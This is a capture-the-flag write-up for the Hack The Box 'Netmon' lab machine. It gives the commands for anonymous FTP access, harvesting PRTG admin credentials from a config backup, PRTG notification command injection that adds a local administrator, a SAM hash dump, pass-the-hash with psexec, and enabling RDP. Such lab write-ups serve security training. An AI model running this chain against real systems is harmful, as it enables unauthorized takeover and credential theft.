---
layout: post
title: HTB Machine - Netmon
subtitle: Writeup
cover-img: https://www.hackthebox.com/storage/avatars/3fa8184483e279369b81becafbac9dee.png
thumbnail-img: https://www.hackthebox.com/storage/avatars/3fa8184483e279369b81becafbac9dee.png
share-img: https://www.hackthebox.com/storage/avatars/3fa8184483e279369b81becafbac9dee.png
tags: [ HTB, Hack the Box,Network,Vulnerability Assessment,Protocols,Outdated Software,FTP,Reconnaissance,Remote Code Execution,Weak Authentication,Anonymous/Guest Access]
---

Windows machine with an ftp and a webpage exposed.
```zsh
crackmapexec smb 10.10.10.152
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:Tru

whatweb http://10.10.10.152
http://10.10.10.152 [302 Found] Country[RESERVED][ZZ], HTTPServer[PRTG/18.1.37.13946], IP[10.10.10.152], PRTG-Network-Monitor[18.1.37.13946,PRTG], RedirectLocation[/index.htm], UncommonHeaders[x-content-type-options], X-XSS-Protection[1; mode=block]
ERROR Opening: http://10.10.10.152/index.htm - incorrect header check
```
We can login to the FTP with anonymous/no pass, navigate to the folder for the first flag. 
```zsh
ftp 10.10.10.152

cd Users/Public

type user.txt
```
Checking the webpage we see that there is PRTG network monitor from Paessler company. We can try default credentials mentioned in a quick google search but no luck with it. By enumerating further the FTP we can check the ProgramData/Paessler/PRTG Network monitor and a few interesting files. Lets get the files in our machine to examine.
```zsh
get PRTG Configuration.old.bak
get PRTG Configuration.dat

cat "PRTG Configuration.old.bak" | grep -i password -B 4
...
	     <!-- User: prtgadmin -->
	     PrTg@dmin2018
...
```
A user and password is mentioned. If we try them directly in the webpage it wont work. But this is an old file, perhaps the credential uses 19 or 20 or 21...

Now that we are in, perhaps we could check vulnerabilities in the software. Searchsploit returns a remote code execution, if we research it we come accross an article explaining it. Basically, there are notifications that can be activated in the software, the notifications have high privileges and due to poor sanitation we can create a user with privileges. 

https://packetstormsecurity.com/files/148334/PRTG-Command-Injection.html

Lets go to Menu-Setup-Notifications-Add new notification. Place a name for the notification and scroll down to execute program, select .ps1, and place the command.
 
```zsh
test.txt;net user rickyb p3nT3st! /add; net localgroup Administrators rickyb /add
```

Save the notification. Back in the main notification panel select our newly created notification and click on 'Send test notification'. This should have triggered the creation of our user that we can verify with crackmapexec.
```zsh
crackmapexec smb 10.10.10.152 -u 'rickyb' -p 'p3nT3st!'
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\rickyb:p3nT3st! (Pwn3d!)

evil-winrm -i 10.10.10.152 -u 'rickyb' -p 'p3nT3st!'

type C:\Users\Administrator\Desktop\root.txt
```
Since we have privileges we can dump the sam and pass the hash to gain access. Also we could activate RDP for an interactive GUI access. Note that RDP port 3389 was not open before we openned it and we confirm with nmap.

```zsh
crackmapexec smb 10.10.10.152 -u 'rickyb' -p 'p3nT3st!' --sam

crackmapexec smb 10.10.10.152 -u 'Administrator' -H '<hashvalue>'

impacket-psexec WORKGROUP/Administrator@10.10.10.152 -hashes <hashvalue> cmd.exe

crackmapexec smb 10.10.10.152 -u 'Administrator' -H '<hashvalue>' -M rdp -o action=enable

nmap -p3389 --open -T5 -v -n 10.10.10.152
```
